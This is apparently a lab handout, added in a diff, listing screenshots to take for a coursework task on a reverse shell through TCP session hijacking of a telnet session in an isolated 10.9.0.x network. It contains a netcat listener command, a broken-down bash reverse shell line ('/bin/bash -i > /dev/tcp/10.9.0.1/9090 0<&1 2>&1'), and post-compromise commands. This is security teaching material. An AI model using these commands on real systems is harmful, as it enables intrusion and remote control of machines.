@@ -1,0 +1,225 @@
+================================================================================
+TASK 4: REVERSE SHELL VIA TCP SESSION HIJACKING - SCREENSHOT INSTRUCTIONS
+================================================================================
+
+This guide outlines the steps and screenshots needed to document your work for
+Task 4: Creating a Reverse Shell using TCP Session Hijacking.
+
+OVERVIEW:
+Your task is to:
+1. Set up a netcat listener on the attacker machine (10.9.0.1)
+2. Launch a TCP session hijacking attack to inject a reverse shell command
+3. Establish a reverse shell connection from the victim (10.9.0.5) back to attacker
+4. Demonstrate shell access on the victim machine
+
+================================================================================
+SCREENSHOT CHECKLIST & STEPS
+================================================================================
+
+STEP 1: PREPARE THE ATTACKER MACHINE (10.9.0.1)
+---------------------------------------------------
+Screenshot 1: Netcat Listener Startup
+  - Open a terminal on the attacker machine (10.9.0.1)
+  - Run: nc -lnv 9090
+  - SCREENSHOT: Show the command and the output "Listening on 0.0.0.0 9090"
+  - Keep this terminal open for the next steps
+
+Screenshot 2: Document IP Address Verification
+  - In another terminal, run: hostname -I
+  - SCREENSHOT: Confirm the attacker IP is 10.9.0.1
+
+
+STEP 2: SET UP THE VICTIM ENVIRONMENT (10.9.0.5)
+---------------------------------------------------
+Screenshot 3: Verify Victim IP
+  - Open terminal on victim machine (10.9.0.5)
+  - Run: hostname -I
+  - SCREENSHOT: Confirm the victim machine IP is 10.9.0.5
+
+Screenshot 4: Telnet Service Status
+  - Run: sudo systemctl status telnetd (or equivalent for your setup)
+  - OR verify telnet is running on the machine
+  - SCREENSHOT: Show telnet service is active/running
+
+
+STEP 3: CREATE A TELNET SESSION (OPTIONAL/INITIAL SETUP)
+---------------------------------------------------
+Screenshot 5: Establish Telnet Connection (if required by your lab)
+  - From the victim machine, establish a telnet session to the server
+  - Run: telnet localhost 23
+  - SCREENSHOT: Show successful telnet connection with prompt
+  - This may already be established - follow your lab instructions
+
+
+STEP 4: LAUNCH TCP SESSION HIJACKING ATTACK
+---------------------------------------------------
+Screenshot 6: Run Hijacking Script
+  - Open a NEW terminal on the attacker machine
+  - Run the TCP session hijacking script: python3 reverse_shell_hijack.py
+  - SCREENSHOT: Show the command execution and any initial output
+  
+Screenshot 7: Injection Confirmation
+  - Capture what the script outputs
+  - SCREENSHOT: Show successful injection message or output indicating packets sent
+  - Note: The telnet window may appear to hang or become unresponsive
+
+
+STEP 5: OBSERVE REVERSE SHELL CONNECTION
+---------------------------------------------------
+Screenshot 8: Connection Received on Netcat Listener
+  - Look at the FIRST terminal where netcat is still listening
+  - SCREENSHOT: Show "Connection received on 10.9.0.5 [PORT]"
+  - This confirms the reverse shell has connected back to the attacker
+
+Screenshot 9: Shell Prompt Appears
+  - SCREENSHOT: Show the shell prompt ($, #, or bash-X.X$) appearing in the netcat window
+  - This indicates you have shell access to the victim machine
+
+
+STEP 6: DEMONSTRATE REVERSE SHELL FUNCTIONALITY
+---------------------------------------------------
+Screenshot 10: Execute Identification Command
+  - In the reverse shell (netcat window), type: whoami
+  - SCREENSHOT: Show output indicating you are running as a user on 10.9.0.5
+
+Screenshot 11: Show Hostname
+  - Run: hostname
+  - SCREENSHOT: Show the output confirms you're on the victim machine
+
+Screenshot 12: List Files/Directory Information
+  - Run: pwd
+  - SCREENSHOT: Show current working directory
+
+Screenshot 13: System Information
+  - Run: uname -a
+  - SCREENSHOT: Show system information from the victim machine
+
+Screenshot 14: Process Listing
+  - Run: ps aux | head -20
+  - SCREENSHOT: Show processes running on victim machine
+
+Screenshot 15: Network Statistics (Optional but recommended)
+  - Run: netstat -tulpn 2>/dev/null | grep 9090
+  - SCREENSHOT: Show connection to attacker port 9090
+
+
+STEP 7: DOCUMENT THE ATTACK FLOW
+---------------------------------------------------
+Screenshot 16: Side-by-side View
+  - If possible, arrange windows so both attacker and victim are visible
+  - SCREENSHOT: Show attacker terminal with netcat listener and reverse shell simultaneously
+  - This demonstrates the established connection
+
+
+STEP 8: PERFORM ADVANCED COMMANDS (OPTIONAL)
+---------------------------------------------------
+Screenshot 17: Create a File
+  - In reverse shell: echo "compromised" > /tmp/evidence.txt
+  - SCREENSHOT: Show command execution
+
+Screenshot 18: Verify File Creation
+  - Run: cat /tmp/evidence.txt
+  - SCREENSHOT: Show file contents confirming file was created
+
+Screenshot 19: Execute Additional Commands
+  - Run commands like: id, date, ifconfig
+  - SCREENSHOT: Show multiple command outputs to prove shell functionality
+
+
+STEP 9: DOCUMENT THE ATTACK CODE
+---------------------------------------------------
+Screenshot 20: Review Attack Script
+  - Open the reverse_shell_hijack.py file
+  - SCREENSHOT: Show the relevant portions of the code that:
+    * Construct the malicious reverse shell command
+    * Send the injected packets
+    * Spoof the TCP session
+
+Screenshot 21: Code Comments
+  - SCREENSHOT: Show commented sections explaining the attack mechanism
+
+
+STEP 10: CLEANUP
+---------------------------------------------------
+Screenshot 22: Graceful Termination
+  - In reverse shell: exit
+  - SCREENSHOT: Show the shell terminating and returning to attacker's machine prompt
+
+Screenshot 23: Netcat Closure
+  - SCREENSHOT: Show netcat listener closing or waiting for next connection
+  - Note any connection closure messages
+
+
+================================================================================
+ADDITIONAL DOCUMENTATION
+================================================================================
+
+For each screenshot, provide:
+  1. What is being shown
+  2. Why this step is important
+  3. What the output demonstrates
+
+Create a document that includes:
+  - Screenshots in order
+  - Brief description of what each screenshot shows
+  - Explanation of how it contributes to demonstrating successful TCP session 
+    hijacking and reverse shell creation
+  - Any relevant command explanations
+  - Discussion of security implications
+
+
+================================================================================
+KEY DOCUMENTATION POINTS TO INCLUDE
+================================================================================
+
+In your report, explain:
+
+1. HOW THE ATTACK WORKS:
+   - Netcat listening on attacker machine
+   - Session hijacking injects reverse shell command
+   - Victim machine connects back to attacker
+   - Attacker gains shell access
+
+2. THE REVERSE SHELL COMMAND COMPONENTS:
+   - /bin/bash -i (interactive shell)
+   - > /dev/tcp/10.9.0.1/9090 (stdout redirection)
+   - 0<&1 (stdin from TCP connection)
+   - 2>&1 (stderr redirection)
+
+3. PROOF OF EXPLOITATION:
+   - Connection confirmation from netcat
+   - Command execution on victim machine
+   - File system access demonstration
+
+4. NETWORK FLOW:
+   - Attacker initiates hijacking attack
+   - Malicious payload injected into existing telnet session
+   - Reverse shell command executes on victim
+   - Victim connects back to attacker's listener port
+
+
+================================================================================
+TIPS FOR SUCCESSFUL SCREENSHOTS
+================================================================================
+
+- Keep terminal text readable (sufficient font size)
+- Timestamp the screenshots if possible
+- Include full command prompts (showing IP/hostname helps identify which machine)
+- Capture both successful commands AND their outputs
+- Label screenshots with step numbers in your report
+- Ensure no credentials are visible in terminal histories
+- Document any error handling or troubleshooting
+
+
+================================================================================
+FILE NAMING CONVENTION
+================================================================================
+
+Screenshot_01_Netcat_Listener.png
+Screenshot_02_Attacker_IP.png
+Screenshot_03_Victim_IP.png
+... and so on
+
+This makes organization and referencing in your report easier.
+
+================================================================================
